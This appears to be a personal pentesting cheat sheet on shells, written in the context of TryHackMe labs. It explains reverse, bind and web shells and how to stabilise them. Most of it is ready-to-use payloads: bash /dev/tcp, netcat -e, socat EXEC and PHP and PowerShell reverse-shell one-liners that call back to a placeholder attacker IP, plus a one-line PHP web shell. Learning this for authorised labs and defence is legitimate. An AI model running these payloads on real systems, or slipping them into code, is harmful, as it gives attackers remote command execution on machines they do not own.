# Shells Overview

A shell is what you get when you exploit a target and gain command execution on it.

---

## Types of Shells

**Reverse Shell**
The target connects back to you. You set up a listener and the target calls home to it. Most common because firewalls usually allow outbound connections.

```bash
# Your listener
nc -lvnp 4444

# Basic bash reverse shell on target
bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
```

**Bind Shell**
You connect to the target. Target opens a port and listens, you connect to it. Less common because firewalls usually block inbound connections.

```bash
# Target
nc -lvnp 4444 -e /bin/bash

# You connect
nc <target-ip> 4444
```

**Web Shell**
Script uploaded to a web server letting you run commands through a browser.

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Access via: `http://target.com/shell.php?cmd=whoami`

---

## Stabilising Shells

Raw netcat shells are unstable and break easily. Upgrade them:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Then:
```
Ctrl + Z
stty raw -echo; fg
export TERM=xterm
```

---

## Netcat

```bash
nc -lvnp 4444     # listener
nc <ip> <port>    # connect
```

---

## Socat

More stable than netcat but not installed by default.

```bash
# Listener
socat TCP-L:<port> -

# Stable TTY listener
socat TCP-L:<port> FILE:`tty`,raw,echo=0

# Target connects back
socat TCP:<ip>:<port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

---

## Common Payloads

**Bash**
```bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

**PHP**
```php
php -r '$sock=fsockopen("<ip>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

**PowerShell**
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Things That Caught Me Out

Use your VPN IP (tun0) on TryHackMe not your local IP

Shell dies when you close terminal — use tmux so your listener stays alive

Not every target has Python or Bash — check what's available first

---

## Resources

- revshells.com — generates payloads automatically
- PayloadsAllTheThings GitHub
- TryHackMe What The Shell room

💻
